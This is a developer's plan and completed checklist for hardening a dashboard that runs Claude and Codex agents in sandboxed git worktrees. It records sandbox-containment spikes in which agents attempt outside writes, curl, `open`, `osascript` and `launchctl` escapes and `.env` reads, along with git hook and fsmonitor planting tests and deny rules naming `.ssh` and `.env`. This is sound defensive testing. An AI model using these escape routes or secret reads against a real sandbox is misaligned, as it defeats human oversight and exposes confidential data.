   - **Old generations cannot move the ticket (Build inspection 1, MPD-R4).** A completion from an older generation is still appended to the run history. It does not update the task's current status, push a tracker state (`_mark_issue_review`, `runner/modules/linear/__init__.py:505`; retry completion, `runner/app.py:2985`), take dispatch ownership, or emit a current-status event. Queued tracker updates are checked against the generation before they are applied.
   - **Per-issue serialization (Round 12, MPD-45).** A generation check alone cannot stop an update that is already in flight. For example, `_push_linear` sends In Review from a daemon thread (`runner/modules/linear/__init__.py:1118-1138`) while the Todo PATCH route calls `update_issue_state` (`:905-906`).
     - Every state-changing tracker operation for an issue (push, reset PATCH, review/rework moves) takes one per-issue lock. It checks the generation inside the lock and applies its update before releasing.
     - A stale operation that finds a newer generation inside the lock does nothing: no state push, no cache replacement, no event.

## Progress Checklist
**Phase 0 — Security Precondition (ships alone, before anything else)**
- [x] Socket.IO origin allow-list from `--host`/`--port` replaces `cors_allowed_origins="*"`
- [x] `TRUSTED_HOSTS` set from `--host`
- [x] Delete `GET /stream` (`runner/app.py:2539`)
- [x] Request token: generated at startup, rendered into `index.html`, checked in one `before_request` hook with the listed exemptions
- [x] Client: `window.fetch` wrapper installed before other scripts
- [x] Client: XHR uploads set the token header — N/A: index.html has no XMLHttpRequest; every upload uses fetch, which the wrapper covers
- [x] Client: Socket.IO connects with `io({auth: {token}})`
- [x] Server: the Socket.IO `connect` handler rejects a missing or wrong token
- [x] `after_request` sets `frame-ancestors 'none'`
- [x] The attachment serve adds `CSP: sandbox`, `nosniff` and `CORP: same-origin`
- [x] Test: `Origin: https://evil.example` Socket.IO handshake is refused and spawns no PTY
- [x] Test: same-origin handshake with the token connects and `pty_start` works
- [x] Test: Socket.IO connect with an allowed Origin but no token is rejected
- [x] Test: `Host: evil.example` on `POST /run` with a JSON body gets 400 and launches nothing
- [x] Test: `GET /stream?prompt=x` gets 404 and creates no `_running_jobs` entry
- [x] Test: `POST /run` with no token gets 403 and launches nothing
- [x] Test: `POST /run` with a wrong token gets 403 and launches nothing
- [x] Test: `POST /run` with the token passes the guard
- [x] Test: multipart `POST /upload` without the token gets 403 and writes no file, even with no `Origin` or `Sec-Fetch-*` headers
- [x] Test: `GET /` gets 200 and carries `frame-ancestors 'none'`
- [x] Test: an uploaded attachment opens through its link without a token, with `CSP: sandbox`, `nosniff` and `CORP: same-origin`
- [x] Manual browser check: a page on another origin loading an uploaded `.js` fixture with `<script src>` never sees the fixture's sentinel global — 2026-10-14 headless Chrome: page on :8599 saw `S=unset`
- [x] Manual browser check: an uploaded `.html` file whose script reads `document.body` runs no script in the dashboard origin — 2026-10-14: `dataset.ran` = no, `self.origin` = `null`
- [x] Manual check at `http://127.0.0.1:8510`: dashboard terminal works — 2026-10-14 headless Chrome: socket connected, shell prompt rendered
- [x] Manual check at `http://127.0.0.1:8510`: run output, upload and STT (`/api/stt`, `/api/linear/id-aliases`) work — `/api/runs` 200, id-aliases 200, uploads 200, `/api/stt` passed the guard (502 from OpenAI on fake audio); no 403s
- [x] Manual check: the same at `http://localhost:8510` — 2026-10-14: same results at localhost

**Phase 0 — registry + verify**
- [x] `projects.example.yaml` (schema) + `.gitignore` entry for `projects.yaml` — done 2026-10-13
- [x] Extend `projects.example.yaml` schema with `seed:` (list), `verify_timeout_s:`, `{root}` placeholder doc
- [x] `runner/projects.py` loader: parse registry (`AGENTIC_OS_PROJECTS` override), expand `~`, validate `path` is a git repo and `verify` is set, every `seed` path exists; unknown key ⇒ clear error
- [x] Worktree helpers: create (base `HEAD`, branch `agent/<id>`, mode 700, seed copy per Decision 1 with containment + link dereference), reuse-if-exists for rework, `cleanup` (remove worktree + branch); refuse when verify target not tracked at `HEAD`
- [x] One hardened git helper (`-c core.fsmonitor=false -c core.hooksPath=/dev/null`, `--no-ext-diff --no-textconv` on diffs; `sandbox-exec` prefix for confidential projects) used by every runner-owned git command on project repos and worktrees
- [x] `projects.py verify <key> --worktree DIR [--base SHA]`: worktree required; prepended PATH, `{root}`/`{base}` expansion, timeout; return {exit, duration_s, tail (local only)}
- [x] Test (`tests/test_projects.py`, tmp git repo fixture, fake project names only): loader validation errors
- [x] Test: PATH prepend
- [x] Test: `{root}`/`{base}` expansion
- [x] Test: seed copy has no symlinks (nested link + file link)
- [x] Test: `..` and absolute seed paths are rejected
- [x] Test: destination symlink ancestor or tracked-path collision ⇒ error
- [x] Test: seed not ignored by the worktree's committed rules (source-only uncommitted ignore rule) ⇒ error
- [x] Test: a seed ignored only by a global excludes file ⇒ error
- [x] Test: a seed ignored only by an uncommitted edit to a tracked `.gitignore` ⇒ error
- [x] Test: a repo with `core.fsmonitor` set to a script and a `post-checkout` hook ⇒ the helper's `git status` and worktree add run neither
- [x] Test: committed seed path ⇒ `seed committed`
- [x] Test: missing seed or dangling link ⇒ error
- [x] Test: untracked verify target ⇒ refusal
- [x] Test: timeout ⇒ non-zero result
- [x] Test: `verify` without `--worktree` ⇒ error
- [x] Fill local `projects.yaml` (gitignored) for the pilot projects + knowledge base; `projects.py verify <key> --worktree <fresh seeded worktree>` exits 0 for each — 2026-10-15: the remaining R project passes too (28 s, fresh seeded worktree, `env -i` shell) after the user had its `.gitignore` committed and its registry env gained `LANG=en_US.UTF-8` (R `sort()` is locale-dependent; launchd sets no LANG). Earlier, 2026-10-14 sandboxed baselines in fresh seeded worktrees: one R project passes (0 fail / 1031 pass, 27 s); the knowledge base passes from the launchd runner context (0.7 s; this shell is TCC-blocked). The other R project's seeds are ignored only by `.git/info/exclude`, so seeding is refused until the user commits `.gitignore` rules for them. A third project was removed from the registry by user decision until its verify target is committed.
- [x] Sandbox spike setup (Decision 9): in a throwaway git repo + worktree, run Claude and Codex once each with the confidential flags, and record the exact flags and settings keys here. A backend that fails any of (a)–(e2) is marked rejected for confidential projects. — 2026-10-14, Claude Code 2.1.300 / codex-cli 0.162.0, throwaway repo; evidence in the session scratchpad `spike/`. Claude flags: `-p --output-format stream-json --verbose --permission-mode acceptEdits --permission-prompts none --add-dir <common> --setting-sources "" --settings '{"sandbox":{"enabled":true,"failIfUnavailable":true,"allowUnsandboxedCommands":false,"autoAllowBashIfSandboxed":true,"excludedCommands":[],"network":{"allowedDomains":[],"strictAllowlist":true},"filesystem":{"allowWrite":["<common>"]}},"permissions":{"deny":["Read(**/.env*)","Read(~/.ssh/**)"]}}'`. Codex flags: `exec --json --sandbox workspace-write --add-dir <common> -c approval_policy="never" -c sandbox_workspace_write.network_access=false -c sandbox_workspace_write.writable_roots=[]`
- [x] Spike (a), Claude and Codex: completes non-interactively without stalling — Claude 14 s, Codex 17 s, both exit 0
- [x] Spike (b), Claude and Codex: the edit ends up committed on `agent/<id>` — Claude commits itself; Codex cannot (`.git` read-only under `workspace-write`, `index.lock: Operation not permitted`), so the runner commits for it (Decision 3a)
- [x] Spike (c), Claude and Codex: a write outside the worktree (e.g. `touch ~/sandbox-probe`) fails — both: `Operation not permitted`, no probe file
- [x] Spike (d), Claude and Codex: a shell network call (e.g. `curl -sI https://example.com`) fails — both: `curl: (6) Could not resolve host`
- [x] Spike (e), Claude: reading `.env` is denied — the `.env` sentinel never appeared in the output
- [x] Spike (e1), Codex: (c) and (d) still fail with a temporary `CODEX_HOME` whose config enables network and adds a writable root — still blocked with `network_access = true` and `writable_roots = ["~"]` in the temp config
- [x] Spike (e2), Claude: (c) and (d) still fail with a permissive `.claude/settings.json` committed in the worktree — a committed settings file with the sandbox disabled, `excludedCommands`, `allowedDomains` and `bypassPermissions` changed nothing (admin-required sandbox via `--settings`)
- [x] Spike (f): a non-confidential Codex run with `--approve-for-me` (no `--sandbox`) finishes under `codex exec` without hanging or waiting on a human (an argv or usage error is fixed, not treated as a failure) — 16 s, exit 0, no prompt
- [x] Spike (f): that run's edit ends up committed on `agent/<id>` — the agent cannot commit (same `.git` read-only limit), so the runner commits (Decision 3a); bypass fallback not needed
- [x] Spike (f): its output shows how an escalation request, such as `curl`, was decided — the JSON events show `curl` failing, then the same command re-run with escalation and returning 200; the agent message reports "Escalation was approved"
- [x] Spike (g): verify under the `sandbox-exec` profile fails both an outside write and a `curl` made from an imported module (if not, confidential dispatch is refused; record it here) — passed: `PermissionError` on the write, `Could not resolve host` on curl
- [x] Spike (g): a normal test passes under the same profile — passed
- [x] Spike (g2): under the `sandbox-exec` profile, `open http://<local listener>`, `osascript -e 'do shell script …'` and `launchctl submit` neither reach the listener nor write outside — 2026-10-14: the original allow-default profile leaked via `open`; the hardened profile blocks all three (test `test_sandbox_blocks_open_url_osascript_and_launchd`)
- [x] Spike (d2), Claude and Codex agent sandboxes: `open -g http://<local listener>` and `osascript … curl` from the agent's shell do not reach the listener — Claude passed 2026-10-14 (both denied, 0 listener hits). Codex passed 2026-10-15 with the confidential argv (workspace-write, network off, approval never): `open -g` refused (kLSExecutableIncorrectFormat), `osascript` `do shell script`, `open location` and `tell Terminal` all failed to load, plain curl exit 7; 0 listener hits. Control outside the sandbox: the same `do shell script` probe reached the listener
- [x] Spike (h): after an agent-style edit sets `core.fsmonitor` to a worktree script and adds a `post-checkout` hook in the shared git dir, the hardened runner git commands (fingerprint `git status`, worktree add/remove) do not run either one — passed; an unhardened `git status` in the same repo did run the fsmonitor script, so the risk is real

**Phase 1 — project/session view (read-only)**
- [x] Reader, Claude: candidate dirs = `~/.claude/projects/<slug>*` for the project path and for its worktree root `~/.agentic-os/worktrees/<key>`, where slug = abs path with every non-alphanumeric char → `-`
- [x] Reader, Claude: keep a session only when its JSONL `cwd` is the project path or under it on a `/` boundary, or under the project's worktree root (parent-directory sessions are not project sessions, matching `claude --resume`)
- [x] Reader, Claude: exclude non-interactive sessions (`entrypoint` starting `sdk-`)
- [x] Reader, Claude: title = last `custom-title`, else last `ai-title` (`aiTitle`), else first real user message; also report mtime, git branch, message count, `memory/*.md` names; per-file results cached with `usage_reader._cached_by_stat`
- [x] Reader, Codex: `~/.codex/state_5.sqlite` opened `mode=ro`, `threads` where `archived=0`, `source IN ('cli','vscode')` (excludes `exec` and subagent threads), `cwd` equals the project path or is under it on a `/` boundary (or under its worktree root); fields title/first_user_message, updated_at, tokens_used, git_branch
- [x] Test (fixture JSONL/SQLite, fake paths): cwd-boundary match (`/a/proj` must not match `/a/proj2`)
- [x] Test: sdk, exec and subagent sessions are excluded
- [x] Test: title precedence
- [x] UI: replace the skill-stack sections with project sections; expanding a project shows the merged Claude + Codex sessions newest-first as `/resume`-style rows, each with a copy-to-clipboard resume command (`cd <session cwd> && claude --resume <id>` / `cd <session cwd> && codex resume <id>`); remove skill-card JS; `/api/projects` endpoint feeds it — 2026-10-14 headless Chrome: 4 project sections, expand shows session rows with copy-resume buttons, no console errors; a registry entry that fails to load shows its error instead of hiding the other projects

**Phase 2 — dispatch**
- [x] Label `project:<key>` → registry key on first launch, and persist the binding (Decision 1)
- [x] One launch helper, used by auto-dispatch, retry/rework and `/run` — N/A for `/run` (user decision 2026-10-15). Dispatch and retry/rework both go through `_run_project_ticket`. `/run` free prompts carry no ticket id to key a worktree and lock on, so they keep today's runner-root launch
- [x] Per-ticket reservation (the flock from Decision 1)
- [x] Project tickets skip skill routing and executable-skill entrypoints
- [x] Project tickets accept only `claude`, `codex` and `dsh` (after `canonical_agent()`); anything else is a clear error
- [x] Dispatch prompt states the branch, "commit on this branch", and the `no_push` rule
- [x] Tracker reset generation (Decision 11): `reset_gen` in task state, incremented by every reset route; launches record it; retry and `_get_task_agent_lock` ignore records from older generations
- [x] Per-issue lock around every state-changing tracker operation (push, reset PATCH, review/rework), with the generation checked inside it (Decision 11)
- [x] Test (DSH-30): run the actual tracker reset route, then retry; the retry starts fresh (no session flag) for claude
- [x] Test (DSH-30): the same for codex
- [x] Test (DSH-30): the same for dsh
- [x] Test (DSH-30): after the reset, an agent change is honored
- [x] Test (DSH-30): reset during a live run, then that run completes with a session id, then retry ⇒ fresh launch, no session flag
- [x] Test (DSH-30): after that old run completes, the task's current status is still Todo, no tracker update to In Review was pushed, and no current-status event was emitted
- [x] Test (DSH-30): an old In Review push delayed in flight while a Todo reset arrives ⇒ the reset wins: final state Todo, no stale cache replacement, no stale event
- [x] Test (DSH-30): restore of a pre-reset run, then retry ⇒ fresh launch
- [x] Test (DSH-30): reset, then a fresh launch that fails before emitting a session id, then retry ⇒ still fresh
- [x] Launch helper streams line by line for every backend and launch path, including Linear dispatch with no `communicate()` wait; normalized `run_event` lines go into a bounded per-run in-memory ring (Decision 3a)
- [x] Test: a fake agent that prints three events with delays produces three `run_event` emits before it exits
- [x] Runner-side commit for sandboxed Codex runs (Decision 3a): prompt says leave changes uncommitted; after reap, hardened `git add -A` + `git commit --no-verify` under the ticket lock, before the seed check and verify
- [x] Test: a sandboxed Codex run that leaves an edit and a seeded file uncommitted ⇒ one runner commit containing the edit and not the seed
- [x] Test: a run with no changes ⇒ no commit
- [x] Test: in a repo with `commit.gpgSign=true` and an unusable signing program, the runner commit still succeeds, unsigned
- [x] After each project run: verify in the worktree (under `sandbox-exec` for confidential bindings), main-checkout status diff, shortstat vs `base_sha`; record as additive run-record fields; card verify badge (Decision 8)
- [x] `tracker_comment` gate (Decision 4) at every automatic comment call site
- [x] Test: a confidential binding whose verify output, error, feedback and attachment contain a sentinel string ⇒ the sentinel is absent from every comment body
- [x] Run-record location guard (Decision 4a): with a confidential project registered, startup fails unless `RUN_LOG`, `STATE_DIR` and `OUTPUTS_DIR` lie inside this checkout and are git-ignored there
- [x] Test: `RUN_LOG_PATH` pointing to a tracked file in an unregistered fixture repo, with a confidential project registered ⇒ startup refused
- [x] Test: `RUN_LOG_PATH` pointing into a registered project's tracked tree ⇒ startup refused
- [x] Test: the default `state/` location ⇒ startup succeeds
- [x] Test: a `RUN_LOG_PATH` inside this checkout that is ignored only by `.git/info/exclude` ⇒ startup refused
- [x] Test: with no confidential project registered, an override does not block startup
- [x] Confidential sandbox (Decision 9): `_ai_cli(binding, interactive=False)` returns the sandboxed command for confidential bindings and rejects `dsh` and any backend that failed the spike
- [x] Test: a confidential binding has no `--dangerously-bypass-approvals-and-sandbox` or `bypassPermissions` in argv
- [x] Test: confidential Codex argv contains `approval_policy="never"`, `sandbox_workspace_write.network_access=false` and an empty `writable_roots`
- [x] Test: `--add-dir` equals the worktree's git common dir
- [x] Test: the Claude settings file has the fail-if-unavailable and no-unsandboxed-retry keys
- [x] Test: Claude argv narrows `--setting-sources`
- [x] Test: non-confidential Codex argv has `--approve-for-me` and no `--sandbox` (or bypass, when spike (f) recorded the fallback), and never `approval_policy="never"`
- [x] Test: non-confidential Claude and `dsh` argv are unchanged
- [x] Test: a rejected backend (`dsh` or a spike-failed one) for a confidential binding gives a clear error and launches nothing
- [x] Test: with spike (g) recorded as failed, every confidential dispatch is refused with a clear error
- [x] Serialize shared-state writes (4b) in `app.py` and `run_skill.py`: flock + mkstemp/replace across each whole read-modify-write
- [x] Serialize `state/tasks.json` (4b): `LocalTracker` and the Linear cache-sync and comment writers take the same flock across load → change → save
- [x] Delete the applied one-off `scripts/migrate_team_fields.py` (MPD-49)
- [x] Test: concurrent writers from two processes ⇒ no lost record, valid JSON
- [x] Test: two concurrent `LocalTracker` updates to different tickets both survive
- [x] Test: a concurrent comment write and state change on the same ticket both survive
- [x] Process-group launch + killpg on every exit path for project agents and verify
- [x] Test: a background writer left by a fake agent that exits 0 is gone before verify runs
- [x] Test: the same after cancel
- [x] Test: a concurrent run in another project does not trip a project's fingerprint
- [x] Test: retry of a bound task after its label changes still uses the original binding
- [x] Test: missing worktree ⇒ fail closed
- [x] Test: a second concurrent launch of the same ticket ⇒ rejected
- [x] Test: `projects.py cleanup` while the ticket is locked ⇒ rejected
- [x] Test: the main-checkout fingerprint catches an edit of an already-dirty file
- [x] Test: the fingerprint catches a commit
- [x] Test: the fingerprint catches a new ignored file
- [x] Test: the fingerprint catches a change to the shared git `config`
- [x] Test: the fingerprint catches `core.fsmonitor` changed only in a pre-existing `include.path` file
- [x] Test: the fingerprint catches a change in `config.worktree` and in a hooks dir redirected by `core.hooksPath`
- [x] Test: the full fingerprint through the hardened helper changes when a hook is added in the default hooks dir
- [x] Closing fingerprint taken after runner commit, seed check and verify; a mismatch fails the run (I4-05)
- [x] Test: a verify that plants a hook in the shared git dir is blocked (confidential) or caught by the closing fingerprint (non-confidential)
- [x] Test: the fingerprint catches a new or changed file in the shared `hooks/` dir
- [x] Fix: every project-run record (cancel, stall, shutdown, error) is written by the launch helper and carries the binding, agent and ancestry; retry, Linear re-dispatch and the feedback route resolve the durable binding from run history before labels (I5-01, I5-03)
- [x] Test: a retry of a record lacking the binding stays bound; a bound issue re-dispatched with its label removed or changed keeps its project and confidentiality
- [x] Fix: a bound ticket whose confidentiality is unknown (registry lookup failed) gets template comments only; persisted confidentiality never weakens (I5-02)
- [x] Test: a failed registry lookup posts no sentinel
- [x] Fix: the record-location guard also runs on every confidential launch; a refused launch writes no prompt text (I5-04)
- [x] Test: a confidential launch with records outside the checkout is refused and its record holds no sentinel
- [x] Fix: streamed agent events refresh the stall timestamp; post-run phases are not stall candidates (I5-07)
- [x] Test: a streaming run passes the stall check; a silent one is stalled with its binding
- [x] Fix: cancel kills the current phase's process group (agent or verify) and stays authoritative: no review comment, record `cancelled` (I5-09)
- [x] Test: cancel during verify kills the verifier and leaves a single `cancelled` record
- [x] Fix: runner commit, uncommitted check, verify, then binding and seed checks; closing fingerprint recorded even on failure (I5-10, I5-11, I5-14)
- [x] Test: a branch switch blocks the runner commit; uncommitted work is badged; a seed committed by verify is caught
- [x] Fix: shutdown refuses new project launches and kills and reaps every in-flight agent and verify group (I5-12)
- [x] Test: shutdown kills an in-flight agent and refuses a late launch
- [x] Fix: Linear placeholder swap uses the locked raw transaction (I5-05); queued state syncs and launch-time pushes carry the generation (I5-06)
- [x] Test: background create swaps the placeholder; a state sync queued before a reset is dropped while the title edit lands
- [x] Fix: the binding (project, ticket, sticky confidentiality, then worktree/branch/base) is persisted in `state/issue_bindings.json` before the agent starts; dispatch, retry, feedback and worktree resume read it (I6-01)
- [x] Fix: one effective policy: a ticket once confidential keeps the sandboxed argv, confined git and verify, and template comments even if the registry flag is dropped; retry resolves it before posting feedback (I6-02, I6-03)
- [x] Fix: startup guard counts `confidential` on invalid entries; confidential terminal tabs and their skill handoffs obey the record-location guard; an unsafe record keeps a fixed error text (I6-04, I6-05)
- [x] Fix: cancel escalates SIGTERM -> SIGKILL after 5 s; every project process (git, agent, verify) is registered and shutdown kills them all and refuses new ones (I6-07, I6-08)
- [x] Fix: the uncommitted check repeats after verify; redispatch of a bound issue requires its original worktree and base; a cancelled run still takes the closing fingerprint (I6-09, I6-10, I6-13)
- [x] Fix: the Linear poller publishes under the issue locks and keeps an entry reset during its fetch; the placeholder swap migrates overrides (I6-11; the I6-12 edit merge was reverted after I8 — pending-create edits are out of scope)
- [x] Test: one regression test per I6 fix (persisted binding mid-run, sticky policy, retry feedback, fixed error, SIGKILL escalation, dirty after verify, no recreated worktree, fingerprint after cancel, declared confidentiality, PTY guard, poller race)
- [x] Cancel parks the ticket In Review, as the legacy cancel route does (I6-06 rejected: Linear has no cancelled state, and nothing re-dispatches a ticket left In Progress)
- [x] Fix: the worktree sidecar carries sticky confidentiality, honoured by `projects.py verify` too; the whole stored binding (worktree, branch, base) must match (I7-02, I7-06)
- [x] Fix: a failed closing snapshot is recorded and badged `main checkout unchecked`; finalization works with git refused at shutdown and shutdown waits for it; the poller locks cached terminal issues too (I7-03, I7-04, I7-07; the I7-05 replay was reverted after I8)
- [x] Test: CLI verify sandboxes a sticky ticket; shutdown writes a redacted record before returning; a relocated worktree root is refused; failed snapshots are badged; a Done ticket reset mid-fetch stays Todo
- [x] History migration of bindings — N/A: no run record has ever carried a project binding (I7-01, checked 2026-10-15)
- [x] Fix: one ticket policy (registry, worktree sidecar, durable binding) for dispatch, resume and verify; a CLI verify promotion persists (I8-01)
- [x] Fix: a cancel before verify keeps the closing check and badge; a cancel arriving once the run is finishing gets 409 instead of a silently ignored 200 (I8-05, I8-06); a reset ticket preserved by the poller is also on its team board (I8-07)
- [x] Test: CLI-made confidential worktree keeps the sandboxed dispatch and resume; cancel before verify keeps the badge; cancel while finishing returns 409; team board keeps a reset ticket
- [x] Pending-create edits (title/state edited while the Linear create is in flight) — N/A: pre-existing local-first gap unrelated to project dispatch; a correct fix needs an acknowledged edit queue (own plan). I6-12/I7-05 attempts reverted after I8-02/03/04
- [x] Fix: a single ticket confidentiality policy (`_ticket_confidential`: registry, sidecar, durable binding) resolved before any fallible step and used by every comment path (I9-01, I9-02)
- [x] Test: a locked CLI-confidential ticket posts only the template; a CLI-verify promotion gates retry feedback and the comment route
- [x] Fix: an unknown policy (unreadable sidecar) stays unknown and is treated as confidential; the unbound labelled comment check uses the same policy (I10-01, I10-02)
- [x] Test: a damaged sidecar posts only the template; a CLI-made confidential worktree gates the comment route before any dashboard run
- [x] Dogfood: one real ticket per registered project end-to-end (dispatch → verify → manual merge or cleanup); record outcome here by key only — 2026-10-15, read-only tickets AGE-98/99/100 labelled `project:<key>`, dispatched from the runner API, Claude backend. Both confidential R projects: worktree on `agent/<id>`, sandboxed run, verify pass (1031 / all pass), Linear got the template comment only, worktree + branch cleaned up. Knowledge base: verify pass, full comment, worktree cleaned up from a dashboard terminal (TCC blocks the Claude Code shell). First pass found two issues, fixed below: one R project failed verify (C locale under launchd → registry env `LANG`), and the main-checkout fingerprint flagged Claude Code's own `.claude/.cc-writes/` staging dir; retry after the fixes: verify pass, main checkout unchanged
- [x] Fix: the main-checkout fingerprint ignores only the metadata of Claude Code's empty settings-staging dir `.claude/.cc-writes` (created in the main checkout even for a worktree run, a real dir, not a symlink); its contents, a file or symlink in its place, and `.claude/settings*.json` still count (I12-01 narrowed the first, whole-prefix version)
- [x] Test: with `.claude/` ignored and untracked, an empty staging dir leaves the fingerprint unchanged; a file inside it, a file or symlink in its place, and a `settings.local.json` change each trip it
- [x] Fresh cross-provider (Codex) reinspection of the `.cc-writes` fingerprint fix returns no unresolved material findings — inspection 12 REVISE (I12-01, fixed); inspection 13 APPROVED, 0 findings (2026-10-15)


**Phase 3 — terminal tabs (Decision 10)**
- [x] Origin fix — N/A: moved to Phase 0 (Security Precondition)
- [x] PTY module: server-owned terminal registry (term_id, kind, project_key, cwd, ring-buffer scrollback, cap 8)
- [x] PTY module: `term_list/open/attach/input/resize/close` events, and no PTY opened on connect
- [x] PTY module: one per-terminal lock shared by the reader and attach
- [x] PTY module: detach on disconnect
- [x] PTY module: close or shutdown kills every process group in the session (found with `ps` and `os.getsid`, pgids deduplicated, a failed enumeration reported as `cleanup_failed`), then `waitpid` and fd close
- [x] PTY module: skill-handoff ported to `term_id`, recording the terminal's `project_key`
- [x] `shell` tabs: open in a project main path or a bound worktree, with registry `env.PATH` prepended
- [x] `shell` tabs: a bound-worktree tab holds the ticket lock while open
- [x] `shell` tabs: `interactive_tab_open` recorded on in-flight runs of the same project, with the badge text variant
- [x] `run` tabs: read-only render of the run's `run_event` ring; at the end, status, verify badge and **Resume in tab** (never while the run is live)
- [x] Resume in tab: command from `_ai_cli(binding, interactive=True)`; button hidden when no eligible interactive form exists
- [x] UI: tab strip, per-tab xterm instance, hide panel without killing, × kills after confirm, **Open terminal** on project headers, **Resume in tab** on session rows
- [x] Test: two terminals in different projects have independent cwd and output, and input to one never reaches the other
- [x] Test: a disconnect followed by reattach replays the scrollback, and the process is still alive
- [x] Test: after a reconnect, `term_list` returns the existing terminals and no new PTY is spawned
- [x] Test: output emitted while `term_attach` runs is neither lost nor duplicated (a fake reader writes continuously during attach)
- [x] Test: close leaves no process behind, including a background job (`sleep 1000 &`), a foreground pipeline in its own process group, and a group whose leader has already exited, and leaves no open fd
- [x] Test: the 9th open is refused
- [x] Test: with a bound-worktree tab open, a retry on that ticket is refused
- [x] Test: with a bound-worktree tab open, `projects.py cleanup` on that ticket is refused
- [x] Test: Resume in tab for a confidential binding uses the sandboxed argv
- [x] Test: Resume in tab is hidden for `dsh` and when no eligible form exists
- [x] Test: a sentinel typed into a `shell` tab is absent from disk after close
- [x] Test: a `run` tab writes nothing beyond the run's existing records
- [x] Fix: Resume in tab derives the ticket from the session folder server-side (taking its lock) and refuses folders outside the project (I5-08)
- [x] Fix: Resume in tab uses the dispatch policy builder for non-confidential projects too (I5-13)
- [x] Test: a resume in a worktree folder holds the ticket lock without a ticket field; non-confidential resume keeps `--approve-for-me` / `bypassPermissions`
- [x] Test: the `interactive_tab_open` flag is set only when a `shell` tab is on that project's main path during the run
- [x] Manual check: three projects running at once, each with its own tab; hide the panel, reload the page, reattach all three; close one and confirm its process is gone (`ps`) — 2026-10-14 headless Chrome against the live runner: 3 project tabs, panel hidden, reload → 3 tabs reattached with their output, close one → its shell gone (3 → 2), no console errors


**Wrap-up**
- [x] Update `AGENTS.md` repository map + `docs/context-maintenance.md`
- [x] `graphify update .`
- [x] Definition of Done: `.venv/bin/python3 -m py_compile runner/*.py runner/projects.py` passes
- [x] Definition of Done: `.venv/bin/python -m pytest tests/` passes
- [x] Fresh cross-provider (Codex) reinspection of the build-inspection-5 fixes — inspection 6 ran: REVISE, 13 findings, 12 fixed and 1 rejected with reason
- [x] Fresh cross-provider (Codex) reinspection of the build-inspection-6 fixes — inspection 7 ran: REVISE, 7 findings, 6 fixed and 1 rejected with evidence
- [x] Fresh cross-provider (Codex) reinspection of the build-inspection-7 fixes — inspection 8 ran: REVISE, 7 findings, 4 fixed, 3 resolved by reverting out-of-scope work
- [x] Fresh cross-provider (Codex) reinspection of the build-inspection-8 fixes — inspection 9 ran: REVISE, 2 findings, both fixed
- [x] Fresh cross-provider (Codex) reinspection of the build-inspection-9 fixes — inspection 10 ran: REVISE, 2 findings, both fixed
- [x] Fresh cross-provider (Codex) reinspection of the build-inspection-10 fixes returns no unresolved material findings — inspection 11 APPROVED, 0 findings (2026-10-15)

## Acceptance Criteria
- [x] For every registered project, `projects.py verify <key> --worktree <fresh seeded worktree>` exits 0 from a non-interactive shell with no manual PATH setup — all registered projects pass (see Phase 0, 2026-10-15)
- [ ] Dashboard lists every registered project; each shows Claude + Codex sessions matching `claude --resume` / `codex resume` pickers in that directory (spot-check ≥3 ids per project) — OPEN: lists all projects (live); the ≥3-id spot check against the `claude --resume` / `codex resume` pickers needs the user
- [x] A ticket labelled `project:<key>` runs in a worktree of that project on branch `agent/<id>`, the main checkout's `git status` is unchanged by the run, and its review card shows the verify result — dogfood 2026-10-15 (see Phase 4): `git status --porcelain` of each main checkout identical before/after; `/api/runs` carries `verify_badge` (pass) that the board card renders
- [x] For a confidential project, every Linear comment for a run (result, error, retry) contains only the fixed template fields
- [x] With a confidential project registered, run records can only live under this checkout's gitignored `state/`/`outputs/`; any other location stops the runner at startup
- [x] Several terminal tabs (shell + run, different projects) run at once
- [x] Hiding the panel or reloading the page keeps every terminal alive and reattachable
- [x] Closing a tab leaves no process behind
- [x] A Socket.IO client sending a foreign `Origin` or no token cannot connect or spawn a PTY
- [x] Every request except the listed exemptions gets 403 without the token, so a cross-site page cannot start a run or write a file
- [x] A foreign `Host` header gets 400, and the dashboard cannot be framed
- [x] The dashboard's own origin still works at both `127.0.0.1` and `localhost`
- [x] `projects.yaml` is not tracked (`git check-ignore projects.yaml` succeeds)
- [x] `python -m pytest tests/` passes (baseline 2026-10-13: 54 passed)


## Constraints
- No project names, paths, client names or data in tracked files (code, docs, tests, fixtures, this plan, its review log) — they live only in `projects.yaml`
- `~/.claude` and `~/.codex` are read-only: no writes, no copying transcripts into agentic-os state
- No new UI beyond the project/session view and the terminal tabs (Decision 10): no transcript viewer, no editing, no terminal persistence across server restarts
- Agents never touch a project's main checkout; AgenticOS writes only to worktrees it created
- Seeded data copies live only under `~/.agentic-os/worktrees/` and are removed with the worktree

## Risks
- `no_push` is prompt-enforced only; an agent could still push. Mitigation: dogfood check that `agent/*` branches exist only locally.
- Seed copies duplicate confidential data on disk until cleanup; stale worktrees accumulate if the user never merges/rejects. `projects.py list` shows worktree age.
- Confidential prompts and outputs sit in plain local run records (Decision 4a). Anyone with the user's disk access can read them; that is the same exposure as the project checkout itself.
- Knowledge-base dir is TCC-protected from some processes (the Claude Code shell got "Operation not permitted" on 2026-10-13); verify must be proven from the launchd runner context. Whether KB skills need gitignored paths (`seed:`) is unverified.
- KB slash-command prompts work only with the Claude backend; other agents receive them as plain text.
- Built-in CLI sandboxes (Decision 9) are vendor features whose flags and settings keys change between releases. A CLI upgrade can silently break confidential dispatch, or make it hang. The runner should check the CLI version, the spike's commands should be rerun after upgrades, and a sandbox failure must surface as a launch error, never as a bypass.
- Terminal tabs are processes owned by the Flask server. If the server restarts (launchd `KeepAlive`), every interactive shell is killed and its scrollback is lost. This is accepted: the tabs are not a tmux replacement. Use tmux inside a tab if a session must survive restarts.
- `ai-title`/`entrypoint`/`source` are undocumented on-disk formats of Claude Code / Codex and may change; readers must degrade to "untitled", not crash.

## Test
`.venv/bin/python -m pytest tests/`; for each key in `projects.yaml`: `projects.py worktree <key> TEST-1`, then `.venv/bin/python3 runner/projects.py verify <key> --worktree <dir>` → exit 0, then `projects.py cleanup`; open dashboard and compare each project's session list with `claude --resume` / `codex resume` run in that directory; dogfood tickets per Phase 2.
